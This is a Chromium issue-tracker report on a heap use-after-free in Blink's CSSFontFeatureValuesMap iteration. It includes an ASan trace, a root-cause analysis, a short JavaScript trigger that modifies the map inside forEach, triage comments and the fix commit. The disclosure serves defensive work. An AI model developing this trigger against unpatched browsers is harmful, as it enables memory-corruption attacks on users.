# Heap-use-after-free in blink::FontFeatureValuesMapIterationSource::FetchNextItem

| Field | Value |
|-------|-------|
| **Issue ID** | [483569511](https://issues.chromium.org/issues/483569511) |
| **Status** | New |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>CSS |
| **Platforms** | Android, Linux, Mac, Windows, ChromeOS |
| **Reporter** | fa...@gmail.com |
| **Assignee** | dr...@chromium.org |
| **Created** | 2026-02-11 |
| **Bounty** | $50,000.00 |

## Description

```
=================================================================
==14716==ERROR: AddressSanitizer: heap-use-after-free on address 0x1299338070a0 at pc 0x7fff28a19313 bp 0x00e5f864bca0 sp 0x00e5f864bce8
READ of size 8 at 0x1299338070a0 thread T78
    #0 0x7fff28a19312 in blink::String::operator= C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\platform\wtf\text\wtf_string.h:110
    #1 0x7fff3d30e3f9 in blink::FontFeatureValuesMapIterationSource::FetchNextItem C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\core\css\css_font_feature_values_map.cc:28
    #2 0x7fff3f3b49c9 in blink::bindings::PairSyncIterationSource<blink::IDLStringBase<0>,blink::IDLSequence<blink::IDLIntegerTypeBase<unsigned int,0> >,blink::String,blink::Vector<unsigned int,0,blink::PartitionAllocator> >::ForEach C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\bindings\core\v8\iterable.h:107
    #3 0x7fff3f3b2457 in blink::`anonymous namespace'::v8_css_font_feature_values_map::ForEachOperationCallback C:\b\s\w\ir\cache\builder\src\out\069a-Win_ASan_Releas\gen\third_party\blink\renderer\bindings\core\v8\v8_css_font_feature_values_map.cc:224
    #4 0x7ea89b690de4  (<unknown module>)

0x1299338070a0 is located 32 bytes inside of 256-byte region [0x129933807080,0x129933807180)
freed by thread T78 here:
    #0 0x7fff9cadc83f in _asan_wrap_memcpy+0x62f (C:\Users\Admin\Desktop\chrome-fuzzer\chrome-asan\clang_rt.asan_dynamic-x86_64.dll+0x18004c83f)
    #1 0x7fff1afb23a3 in _free_base C:\b\s\w\ir\cache\builder\src\third_party\llvm\compiler-rt\lib\asan\asan_malloc_win_thunk.cpp:52
    #2 0x7fff3c9f3e73 in blink::HashTable<blink::AtomicString,blink::KeyValuePair<blink::AtomicString,blink::FeatureIndicesWithPriority>,blink::KeyValuePairExtractor,blink::HashMapValueTraits<blink::HashTraits<blink::AtomicString>,blink::HashTraits<blink::FeatureIndicesWithPriority> >,blink::HashTraits<blink::AtomicString>,blink::PartitionAllocator>::clear C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\platform\wtf\hash_table.h:1801
    #3 0x7fff3c9f36b8 in blink::HashTable<blink::AtomicString,blink::KeyValuePair<blink::AtomicString,blink::FeatureIndicesWithPriority>,blink::KeyValuePairExtractor,blink::HashMapValueTraits<blink::HashTraits<blink::AtomicString>,blink::HashTraits<blink::FeatureIndicesWithPriority> >,blink::HashTraits<blink::AtomicString>,blink::PartitionAllocator>::RehashTo C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\platform\wtf\hash_table.h:1736
    #4 0x7fff3c9f32bf in blink::HashTable<blink::AtomicString,blink::KeyValuePair<blink::AtomicString,blink::FeatureIndicesWithPriority>,blink::KeyValuePairExtractor,blink::HashMapValueTraits<blink::HashTraits<blink::AtomicString>,blink::HashTraits<blink::FeatureIndicesWithPriority> >,blink::HashTraits<blink::AtomicString>,blink::PartitionAllocator>::Expand C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\platform\wtf\hash_table.h:1626
    #5 0x7fff3c9f42b6 in blink::HashTable<blink::AtomicString,blink::KeyValuePair<blink::AtomicString,blink::FeatureIndicesWithPriority>,blink::KeyValuePairExtractor,blink::HashMapValueTraits<blink::HashTraits<blink::AtomicString>,blink::HashTraits<blink::FeatureIndicesWithPriority> >,blink::HashTraits<blink::AtomicString>,blink::PartitionAllocator>::insert<blink::HashMapTranslator<blink::HashTraits<blink::AtomicString>,blink::HashMapValueTraits<blink::HashTraits<blink::AtomicString>,blink::HashTraits<blink::FeatureIndicesWithPriority> > >,blink::AtomicString &,blink::FeatureIndicesWithPriority> C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\platform\wtf\hash_table.h:1280
    #6 0x7fff3d30c2dc in blink::CSSFontFeatureValuesMap::set C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\core\css\css_font_feature_values_map.cc:76
    #7 0x7fff3f3b0bb8 in blink::`anonymous namespace'::v8_css_font_feature_values_map::SetOperationCallback C:\b\s\w\ir\cache\builder\src\out\069a-Win_ASan_Releas\gen\third_party\blink\renderer\bindings\core\v8\v8_css_font_feature_values_map.cc:104
    #8 0x7ea89b690de4  (<unknown module>)

previously allocated by thread T78 here:
    #0 0x7fff9cadc94f in _asan_wrap_memcpy+0x73f (C:\Users\Admin\Desktop\chrome-fuzzer\chrome-asan\clang_rt.asan_dynamic-x86_64.dll+0x18004c94f)
    #1 0x7fff1afb23c3 in _malloc_base C:\b\s\w\ir\cache\builder\src\third_party\llvm\compiler-rt\lib\asan\asan_malloc_win_thunk.cpp:64
    #2 0x7fff2f49729d in partition_alloc::PartitionRoot::Alloc<0> C:\b\s\w\ir\cache\builder\src\base\allocator\partition_allocator\src\partition_alloc\partition_root.h:532
    #3 0x7fff3c9f172c in blink::HashTable<blink::AtomicString,blink::KeyValuePair<blink::AtomicString,blink::FeatureIndicesWithPriority>,blink::KeyValuePairExtractor,blink::HashMapValueTraits<blink::HashTraits<blink::AtomicString>,blink::HashTraits<blink::FeatureIndicesWithPriority> >,blink::HashTraits<blink::AtomicString>,blink::PartitionAllocator>::HashTable C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\platform\wtf\hash_table.h:1835
    #4 0x7fff3c9ed25b in blink::FontFeatureValuesStorage::FontFeatureValuesStorage C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\core\css\style_rule_font_feature_values.cc:48
    #5 0x7fff3c9f00d8 in blink::StyleRuleFontFeatureValues::StyleRuleFontFeatureValues C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\core\css\style_rule_font_feature_values.cc:145
    #6 0x7fff3cec9c63 in cppgc::MakeGarbageCollectedTrait<blink::StyleRuleFontFeatureValues>::Call<blink::Vector<blink::AtomicString,0,blink::PartitionAllocator>,blink::HashMap<blink::AtomicString,blink::FeatureIndicesWithPriority,blink::HashTraits<blink::AtomicString>,blink::HashTraits<blink::FeatureIndicesWithPriority>,blink::PartitionAllocator> &,blink::HashMap<blink::AtomicString,blink::FeatureIndicesWithPriority,blink::HashTraits<blink::AtomicString>,blink::HashTraits<blink::FeatureIndicesWithPriority>,blink::PartitionAllocator> &,blink::HashMap<blink::AtomicString,blink::FeatureIndicesWithPriority,blink::HashTraits<blink::AtomicString>,blink::HashTraits<blink::FeatureIndicesWithPriority>,blink::PartitionAllocator> &,blink::HashMap<blink::AtomicString,blink::FeatureIndicesWithPriority,blink::HashTraits<blink::AtomicString>,blink::HashTraits<blink::FeatureIndicesWithPriority>,blink::PartitionAllocator> &,blink::HashMap<blink::AtomicString,blink::FeatureIndicesWithPriority,blink::HashTraits<blink::AtomicString>,blink::HashTraits<blink::FeatureIndicesWithPriority>,blink::PartitionAllocator> &,blink::HashMap<blink::AtomicString,blink::FeatureIndicesWithPriority,blink::HashTraits<blink::AtomicString>,blink::HashTraits<blink::FeatureIndicesWithPriority>,blink::PartitionAllocator> &> C:\b\s\w\ir\cache\builder\src\v8\include\cppgc\allocation.h:239
    #7 0x7fff3ce99851 in blink::CSSParserImpl::ConsumeFontFeatureValuesRule C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\core\css\parser\css_parser_impl.cc:1807
    #8 0x7fff3ce92319 in blink::CSSParserImpl::ConsumeAtRuleContents C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\core\css\parser\css_parser_impl.cc:894
    #9 0x7fff3ce88050 in blink::CSSParserImpl::ParseStyleSheet C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\core\css\parser\css_parser_impl.cc:497
    #10 0x7fff3c9c4c76 in blink::StyleSheetContents::ParseString C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\core\css\style_sheet_contents.cc:510
    #11 0x7fff3ca6b07b in blink::StyleEngine::CreateSheet C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\core\css\style_engine.cc:1191
    #12 0x7fff3cabd301 in blink::StyleElement::CreateSheetOrModule C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\core\css\style_element.cc:246
    #13 0x7fff3cabc6bd in blink::StyleElement::FinishParsingChildren C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\core\css\style_element.cc:149
    #14 0x7fff3b7d9504 in blink::HTMLStyleElement::FinishParsingChildren C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\core\html\html_style_element.cc:69
    #15 0x7fff3e4a4464 in blink::HTMLElementStack::PopCommon C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\core\html\parser\html_element_stack.cc:512
    #16 0x7fff3e41cf9a in blink::HTMLTreeBuilder::ProcessEndTag C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\core\html\parser\html_tree_builder.cc:2328
    #17 0x7fff3e41ab56 in blink::HTMLTreeBuilder::ProcessToken C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\core\html\parser\html_tree_builder.cc:464
    #18 0x7fff3e418987 in blink::HTMLTreeBuilder::ConstructTree C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\core\html\parser\html_tree_builder.cc:416
    #19 0x7fff3e53db2b in blink::HTMLDocumentParser::PumpTokenizer C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\core\html\parser\html_document_parser.cc:761
    #20 0x7fff3e53b843 in blink::HTMLDocumentParser::PumpTokenizerIfPossible C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\core\html\parser\html_document_parser.cc:625
    #21 0x7fff3e549b30 in blink::HTMLDocumentParser::FinishAppend C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\core\html\parser\html_document_parser.cc:1028
    #22 0x7fff3e54a1e3 in blink::HTMLDocumentParser::CommitPreloadedData C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\core\html\parser\html_document_parser.cc:1043
    #23 0x7fff3a652cb6 in blink::DocumentLoader::StartLoadingResponse C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\core\loader\document_loader.cc:2140
    #24 0x7fff3a6631f8 in blink::DocumentLoader::CommitNavigation C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\core\loader\document_loader.cc:3184
    #25 0x7fff3a4ab314 in blink::FrameLoader::CommitDocumentLoader C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\core\loader\frame_loader.cc:1450
    #26 0x7fff3a4b7582 in blink::FrameLoader::CommitNavigation C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\core\loader\frame_loader.cc:1262
    #27 0x7fff3bcbc059 in blink::WebLocalFrameImpl::CommitNavigation C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\core\frame\web_local_frame_impl.cc:2815

Thread T78 created by T0 here:
    #0 0x7fff9caedc94 in _asan_wrap_CreateThread+0x64 (C:\Users\Admin\Desktop\chrome-fuzzer\chrome-asan\clang_rt.asan_dynamic-x86_64.dll+0x18005dc94)
    #1 0x7fff2f0f71db in base::`anonymous namespace'::CreateThreadInternal C:\b\s\w\ir\cache\builder\src\base\threading\platform_thread_win.cc:178
    #2 0x7fff2f1d2568 in base::Thread::StartWithOptions C:\b\s\w\ir\cache\builder\src\base\threading\thread.cc:228
    #3 0x7fff25c8f623 in content::RenderProcessHostImpl::Init C:\b\s\w\ir\cache\builder\src\content\browser\renderer_host\render_process_host_impl.cc:1916
    #4 0x7fff256ff021 in content::AgentSchedulingGroupHost::Init C:\b\s\w\ir\cache\builder\src\content\browser\renderer_host\agent_scheduling_group_host.cc:244
    #5 0x7fff25c51dc3 in content::RenderFrameHostManager::InitRenderView C:\b\s\w\ir\cache\builder\src\content\browser\renderer_host\render_frame_host_manager.cc:4724
    #6 0x7fff25c3fa4e in content::RenderFrameHostManager::ReinitializeMainRenderFrame C:\b\s\w\ir\cache\builder\src\content\browser\renderer_host\render_frame_host_manager.cc:4976
    #7 0x7fff25c38198 in content::RenderFrameHostManager::GetFrameHostForNavigation C:\b\s\w\ir\cache\builder\src\content\browser\renderer_host\render_frame_host_manager.cc:2130
    #8 0x7fff25c351a9 in content::RenderFrameHostManager::DidCreateNavigationRequest C:\b\s\w\ir\cache\builder\src\content\browser\renderer_host\render_frame_host_manager.cc:1596
    #9 0x7fff257da730 in content::FrameTreeNode::TakeNavigationRequest C:\b\s\w\ir\cache\builder\src\content\browser\renderer_host\frame_tree_node.cc:628
    #10 0x7fff25aa75aa in content::Navigator::Navigate C:\b\s\w\ir\cache\builder\src\content\browser\renderer_host\navigator.cc:988
    #11 0x7fff2599339d in content::NavigationControllerImpl::NavigateWithoutEntry C:\b\s\w\ir\cache\builder\src\content\browser\renderer_host\navigation_controller_impl.cc:4132
    #12 0x7fff25991737 in content::NavigationControllerImpl::LoadURLWithParams C:\b\s\w\ir\cache\builder\src\content\browser\renderer_host\navigation_controller_impl.cc:1569
    #13 0x7fff4634ecdb in Navigate C:\b\s\w\ir\cache\builder\src\chrome\browser\ui\browser_navigator.cc:815
    #14 0x7fff2af1720f in StartupBrowserCreatorImpl::OpenTabsInBrowser C:\b\s\w\ir\cache\builder\src\chrome\browser\ui\startup\startup_browser_creator_impl.cc:383
    #15 0x7fff2af197ad in StartupBrowserCreatorImpl::RestoreOrCreateBrowser C:\b\s\w\ir\cache\builder\src\chrome\browser\ui\startup\startup_browser_creator_impl.cc:702
    #16 0x7fff2af15bdd in StartupBrowserCreatorImpl::DetermineURLsAndLaunch C:\b\s\w\ir\cache\builder\src\chrome\browser\ui\startup\startup_browser_creator_impl.cc:501
    #17 0x7fff2af14ca5 in StartupBrowserCreatorImpl::Launch C:\b\s\w\ir\cache\builder\src\chrome\browser\ui\startup\startup_browser_creator_impl.cc:221
    #18 0x7fff2af0ccc5 in StartupBrowserCreator::LaunchBrowser C:\b\s\w\ir\cache\builder\src\chrome\browser\ui\startup\startup_browser_creator.cc:730
    #19 0x7fff2af0d60d in `anonymous namespace'::OpenNewWindowForFirstRun C:\b\s\w\ir\cache\builder\src\chrome\browser\ui\startup\startup_browser_creator.cc:472
    #20 0x7fff2af1392f in base::internal::Invoker<base::internal::FunctorTraits<void (*&&)(const base::CommandLine &, Profile *, const base::FilePath &, const std::__Cr::vector<GURL,std::__Cr::allocator<GURL> > &, chrome::startup::IsProcessStartup, chrome::startup::IsFirstRun, bool),base::CommandLine &&,Profile *&&,base::FilePath &&,std::__Cr::vector<GURL,std::__Cr::allocator<GURL> > &&,chrome::startup::IsProcessStartup &&,chrome::startup::IsFirstRun &&>,base::internal::BindState<0,1,0,void (*)(const base::CommandLine &, Profile *, const base::FilePath &, const std::__Cr::vector<GURL,std::__Cr::allocator<GURL> > &, chrome::startup::IsProcessStartup, chrome::startup::IsFirstRun, bool),base::CommandLine,base::internal::UnretainedWrapper<Profile,base::unretained_traits::MayNotDangle,0>,base::FilePath,std::__Cr::vector<GURL,std::__Cr::allocator<GURL> >,chrome::startup::IsProcessStartup,chrome::startup::IsFirstRun>,void (bool)>::RunOnce C:\b\s\w\ir\cache\builder\src\base\functional\bind_internal.h:982
    #21 0x7fff2af2d00b in FirstRunService::OpenFirstRunInternal C:\b\s\w\ir\cache\builder\src\chrome\browser\ui\startup\first_run_service.cc:271
    #22 0x7fff2af2df40 in base::internal::Invoker<base::internal::FunctorTraits<void (FirstRunService::*&&)(),base::WeakPtr<FirstRunService> &&>,base::internal::BindState<1,1,0,void (FirstRunService::*)(),base::WeakPtr<FirstRunService> >,void ()>::RunOnce C:\b\s\w\ir\cache\builder\src\base\functional\bind_internal.h:982
    #23 0x7fff2f4416e2 in base::ScopedClosureRunner::~ScopedClosureRunner C:\b\s\w\ir\cache\builder\src\base\functional\callback_helpers.cc:27
    #24 0x7fff2af2b83a in FirstRunService::TryMarkFirstRunAlreadyFinished C:\b\s\w\ir\cache\builder\src\chrome\browser\ui\startup\first_run_service.cc:182
    #25 0x7fff2af2cc0f in FirstRunService::OpenFirstRunIfNeeded C:\b\s\w\ir\cache\builder\src\chrome\browser\ui\startup\first_run_service.cc:260
    #26 0x7fff2af0cc64 in StartupBrowserCreator::LaunchBrowser C:\b\s\w\ir\cache\builder\src\chrome\browser\ui\startup\startup_browser_creator.cc:722
    #27 0x7fff2af0dc99 in StartupBrowserCreator::LaunchBrowserForLastProfiles C:\b\s\w\ir\cache\builder\src\chrome\browser\ui\startup\startup_browser_creator.cc:824
    #28 0x7fff2af0c397 in StartupBrowserCreator::ProcessCmdLineImpl C:\b\s\w\ir\cache\builder\src\chrome\browser\ui\startup\startup_browser_creator.cc:1310
    #29 0x7fff2af0a0ef in StartupBrowserCreator::Start C:\b\s\w\ir\cache\builder\src\chrome\browser\ui\startup\startup_browser_creator.cc:684
    #30 0x7fff2edab62d in ChromeBrowserMainParts::PreMainMessageLoopRunImpl C:\b\s\w\ir\cache\builder\src\chrome\browser\chrome_browser_main.cc:1998
    #31 0x7fff2edaa38b in ChromeBrowserMainParts::PreMainMessageLoopRun C:\b\s\w\ir\cache\builder\src\chrome\browser\chrome_browser_main.cc:1416
    #32 0x7fff2471e572 in content::BrowserMainLoop::PreMainMessageLoopRun C:\b\s\w\ir\cache\builder\src\content\browser\browser_main_loop.cc:1017
    #33 0x7fff24725cf4 in base::internal::Invoker<base::internal::FunctorTraits<int (content::BrowserMainLoop::*&&)(),content::BrowserMainLoop *>,base::internal::BindState<1,1,0,int (content::BrowserMainLoop::*)(),base::internal::UnretainedWrapper<content::BrowserMainLoop,base::unretained_traits::MayNotDangle,0> >,int ()>::RunOnce C:\b\s\w\ir\cache\builder\src\base\functional\bind_internal.h:982
    #34 0x7fff261bbc6e in content::StartupTaskRunner::RunAllTasksNow C:\b\s\w\ir\cache\builder\src\content\browser\startup_task_runner.cc:49
    #35 0x7fff2471d40c in content::BrowserMainLoop::CreateStartupTasks C:\b\s\w\ir\cache\builder\src\content\browser\browser_main_loop.cc:923
    #36 0x7fff24728790 in content::BrowserMainRunnerImpl::Initialize C:\b\s\w\ir\cache\builder\src\content\browser\browser_main_runner_impl.cc:138
    #37 0x7fff247179b9 in content::BrowserMain C:\b\s\w\ir\cache\builder\src\content\browser\browser_main.cc:28
    #38 0x7fff2af4561a in content::RunBrowserProcessMain C:\b\s\w\ir\cache\builder\src\content\app\content_main_runner_impl.cc:696
    #39 0x7fff2af48b75 in content::ContentMainRunnerImpl::RunBrowser C:\b\s\w\ir\cache\builder\src\content\app\content_main_runner_impl.cc:1312
    #40 0x7fff2af4813c in content::ContentMainRunnerImpl::Run C:\b\s\w\ir\cache\builder\src\content\app\content_main_runner_impl.cc:1145
    #41 0x7fff2af3c0cf in content::RunContentProcess C:\b\s\w\ir\cache\builder\src\content\app\content_main.cc:358
    #42 0x7fff2af3c872 in content::ContentMain C:\b\s\w\ir\cache\builder\src\content\app\content_main.cc:371
    #43 0x7fff1afb2b06 in ChromeMain C:\b\s\w\ir\cache\builder\src\chrome\app\chrome_main.cc:191
    #44 0x7ff7fd1d4807 in MainDllLoader::Launch C:\b\s\w\ir\cache\builder\src\chrome\app\main_dll_loader_win.cc:204
    #45 0x7ff7fd1d2074 in main C:\b\s\w\ir\cache\builder\src\chrome\app\chrome_exe_main_win.cc:351
    #46 0x7ff7fd6c9bbf in __scrt_common_main_seh D:\a\_work\1\s\src\vctools\crt\vcstartup\src\startup\exe_common.inl:288
    #47 0x7ff82703e8d6 in BaseThreadInitThunk+0x16 (C:\WINDOWS\System32\KERNEL32.DLL+0x18002e8d6)
    #48 0x7ff828fac40b in RtlUserThreadStart+0x2b (C:\WINDOWS\SYSTEM32\ntdll.dll+0x18008c40b)

SUMMARY: AddressSanitizer: heap-use-after-free C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\platform\wtf\text\wtf_string.h:110 in blink::String::operator=
Shadow bytes around the buggy address:
  0x129933806e00: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x129933806e80: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x129933806f00: fa fa fa fa fa fa f7 fa fd fd fd fd fd fd fd fd
  0x129933806f80: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x129933807000: fd fd fd fd fd fd fd fd fa fa fa fa fa fa f7 fa
=>0x129933807080: fd fd fd fd[fd]fd fd fd fd fd fd fd fd fd fd fd
  0x129933807100: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x129933807180: fa fa fa fa fa fa f7 fa fd fd fd fd fd fd fd fd
  0x129933807200: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x129933807280: fd fd fd fd fd fd fd fd fa fa fa fa fa fa f7 fa
  0x129933807300: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb

==14716==ADDITIONAL INFO

==14716==Note: Please include this section with the ASan report.
Task trace:
    #0 0x7fff329ed269 in IPC::ChannelAssociatedGroupController::Accept C:\b\s\w\ir\cache\builder\src\ipc\ipc_mojo_bootstrap.cc:1138
    #1 0x7fff2f8d745b in mojo::SimpleWatcher::Context::Notify C:\b\s\w\ir\cache\builder\src\mojo\public\cpp\system\simple_watcher.cc:103
    #2 0x7fff2f8d745b in mojo::SimpleWatcher::Context::Notify C:\b\s\w\ir\cache\builder\src\mojo\public\cpp\system\simple_watcher.cc:103
    #3 0x7fff310e4dd4 in net::TCPSocketDefaultWin::ReadIfReady C:\b\s\w\ir\cache\builder\src\net\socket\tcp_socket_win.cc:724


Command line: `"C:\Users\Admin\Desktop\chrome-fuzzer\chrome-asan\chrome.exe" --single-process --user-data-dir="C:\\Users\\Admin\\AppData\\Local\\Temp\\tmp0soadlxc_" --flag-switches-begin --flag-switches-end --gpu-preferences=SAAAAAAAAADoAQAEAAAAAAAAAAAAAMAAAwAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAAAAAAAAAAAQAAAAAAAAABAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAA== --lang=en-GB --num-raster-threads=4 --enable-main-frame-before-activation --file-url-path-alias="/gen=C:\Users\Admin\Desktop\chrome-fuzzer\chrome-asan\gen" http://127.0.0.1:8080/poc.html`


MiraclePtr Status: NOT PROTECTED
No raw_ptr<T> access to this region was detected prior to this crash.
This crash is still exploitable with MiraclePtr.
Refer to https://chromium.googlesource.com/chromium/src/+/main/base/memory/raw_ptr.md for details.

==14716==END OF ADDITIONAL INFO

==14716==ABORTING

```
#### VERSION

Version 146.0.7677.0 (Developer Build) (64-bit)

#### REPRODUCTION CASE

Build: [win32-release\_x64%2Fasan-win32-release\_x64-1581412](https://www.googleapis.com/download/storage/v1/b/chromium-browser-asan/o/win32-release_x64%2Fasan-win32-release_x64-1581412.zip?generation=1770535372136975&alt=media)

Run: `./chrome.exe --single-process poc.html`

---

Reporter credit: Shaheen Fazim

## Attachments

- [poc.html](attachments/poc.html) (text/html, 416 B)
- [exploit.md](attachments/exploit.md) (text/markdown, 3.1 KB)
- [poc.html](attachments/poc.html) (text/html, 1.2 KB)
- [poc-write.html](attachments/poc-write.html) (text/html, 9.6 KB)
- [v8.patch](attachments/v8.patch) (text/x-diff, 6.4 KB)
- [exploit-write.md](attachments/exploit-write.md) (text/markdown, 5.5 KB)

## Timeline

### fa...@gmail.com (2026-02-11)

# Root Cause Analysis: Heap-Use-After-Free in CSSFontFeatureValuesMap

## Summary

A Heap-Use-After-Free (UAF) vulnerability exists in `blink::FontFeatureValuesMapIterationSource`. The issue occurs when a [CSSFontFeatureValuesMap](https://source.chromium.org/chromium/chromium/src/+/main:third_party/blink/renderer/core/css/css_font_feature_values_map.h;l=29-36) is modified (elements added or removed) while it is being iterated over by a script. The modification can trigger a rehash of the underlying `WTF::HashMap`, invalidating the active iterator held by the iteration source. Subsequent access to the invalid iterator results in a UAF.

## Vulnerability Details

The [CSSFontFeatureValuesMap](https://source.chromium.org/chromium/chromium/src/+/main:third_party/blink/renderer/core/css/css_font_feature_values_map.h;l=29-36) class wraps a `FontFeatureAliases` object, which is an alias for `WTF::HashMap<AtomicString, FeatureIndicesWithPriority>`. The [FontFeatureValuesMapIterationSource](https://source.chromium.org/chromium/chromium/src/+/main:third_party/blink/renderer/core/css/css_font_feature_values_map.cc;l=12-45) class, used for the map's iterator, stores a raw `FontFeatureAliases::const_iterator` to the underlying map.

**File:** [third\_party/blink/renderer/core/css/css\_font\_feature\_values\_map.cc](https://source.chromium.org/chromium/chromium/src/+/main:third_party/blink/renderer/core/css/css_font_feature_values_map.cc)

```
class FontFeatureValuesMapIterationSource final
    : public PairSyncIterable<CSSFontFeatureValuesMap>::IterationSource {
 public:
  FontFeatureValuesMapIterationSource(const CSSFontFeatureValuesMap& map,
                                      const FontFeatureAliases* aliases)
      : map_(map), aliases_(aliases), iterator_(aliases->begin()) {}

  bool FetchNextItem(ScriptState* script_state,
                     String& map_key,
                     Vector<uint32_t>& map_value) override {
    // ...
    // iterator_ is used here. 
    // If aliases_ was rehashed, iterator_ points to freed memory.
    map_key = iterator_->key; 
    map_value = iterator_->value.indices;
    ++iterator_;
    return true;
  }
  // ...
 private:
  const Member<const CSSFontFeatureValuesMap> map_;
  const FontFeatureAliases* aliases_;
  FontFeatureAliases::const_iterator iterator_;
};

```

When `CSSFontFeatureValuesMap::set()` or [deleteForBinding()](https://source.chromium.org/chromium/chromium/src/+/main:third_party/blink/renderer/core/css/css_font_feature_values_map.cc;l=96-107) is called, the underlying `aliases_` map is modified directly:

```
CSSFontFeatureValuesMap* CSSFontFeatureValuesMap::set(...) {
  // ...
  aliases_->Set(key_atomic, ...); // Can trigger Rehash/Expand
  return this;
}

```

If [Set](https://source.chromium.org/chromium/chromium/src/+/main:third_party/blink/renderer/core/css/style_rule_font_feature_values.h;l=119-120) triggers a rehash (to expand the table), the old storage is freed. The `iterator_` in [FontFeatureValuesMapIterationSource](https://source.chromium.org/chromium/chromium/src/+/main:third_party/blink/renderer/core/css/css_font_feature_values_map.cc;l=12-45) remains pointing to the old, now freed, storage.

## Crash Analysis

The crash stack trace confirms this sequence:

1. `v8_css_font_feature_values_map::ForEach` calls [FetchNextItem](https://source.chromium.org/chromium/chromium/src/+/main:third_party/blink/renderer/core/css/css_font_feature_values_map.cc;l=19-33).
2. [FetchNextItem](https://source.chromium.org/chromium/chromium/src/+/main:third_party/blink/renderer/core/css/css_font_feature_values_map.cc;l=19-33) accesses `iterator_->key`.
3. The memory pointed to by `iterator_` has been freed by a previous [set](https://source.chromium.org/chromium/chromium/src/+/main:third_party/blink/renderer/core/css/css_font_feature_values_map.cc;l=67-90) call (which triggered `HashTable::Expand` -> `RehashTo` -> [clear](https://source.chromium.org/chromium/chromium/src/+/main:third_party/blink/renderer/core/css/css_font_feature_values_map.cc;l=91-95) -> `_free_base`).
4. ASAN detects the read from the freed region.

## Reproduction

The provided PoC iterates over the map and inserts new keys, which eventually forces a rehash of the `HashMap`.

```
  const map = rule.styleset;
  map.forEach((value, key) => {
    map.delete(key);
    for(let i=0; i<100; i++) {
        // Inserts trigger rehash, invalidating the iterator used by forEach
        map.set(`newkey_${i}`, i); 
    }
  });

```
## Recommended Fix

To make the iteration safe against modification, the [FontFeatureValuesMapIterationSource](https://source.chromium.org/chromium/chromium/src/+/main:third_party/blink/renderer/core/css/css_font_feature_values_map.cc;l=12-45) should take a snapshot of the map entries during construction. This isolates the iterator from changes to the underlying map. This ensures that [FetchNextItem](https://source.chromium.org/chromium/chromium/src/+/main:third_party/blink/renderer/core/css/css_font_feature_values_map.cc;l=19-33) always operates on valid memory, adhering to the safety requirements for iterating over modified collections in Blink.

### dr...@chromium.org (2026-02-11)

[security triage] This reproduces cleanly in M144. Setting labels accordingly.

### dr...@chromium.org (2026-02-12)

After discussion with andruud@, we agree that a correct fix: implementing an iteration compatible with modifcations of the `interface CSSFontFeatureValuesMap { maplike<CSSOMString, sequence<unsigned long>>; [...]` is too risky as an immediate mitigation.

Instead, as an immediate fix, we take a copy of the items to be iterated (as also suggested in #2). The full fix is left as a TODO, tracked in [issue 483936078](https://issues.chromium.org/issues/483936078). I don't think this poses a concrete real-world issue right now, as I would estimate CSSOM usage of font-feature-values to be very low.

### ch...@google.com (2026-02-12)

Setting milestone because of s0/s1 severity.

### dx...@google.com (2026-02-12)

Project: chromium/src  

Branch:  main  

Author:  Dominik Röttsches [drott@chromium.org](mailto:drott@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7566570>

Avoid stale iteration in CSSFontFeatureValuesMap

---


Expand for full commit details
```
     
    To avoid invalid iterator state, take a snapshot of the 
    map when creating the iteration source. This addresses 
    the immediate problem of iterating while modifying. 
     
    Remaining work tracked in https://crbug.com/483936078 
     
    Fixed: 483569511 
    Change-Id: Ie29cfdf7ed94bbe189b44c842a5efce571bb2cee 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7566570 
    Commit-Queue: Dominik Röttsches <drott@chromium.org> 
    Reviewed-by: Anders Hartvoll Ruud <andruud@chromium.org> 
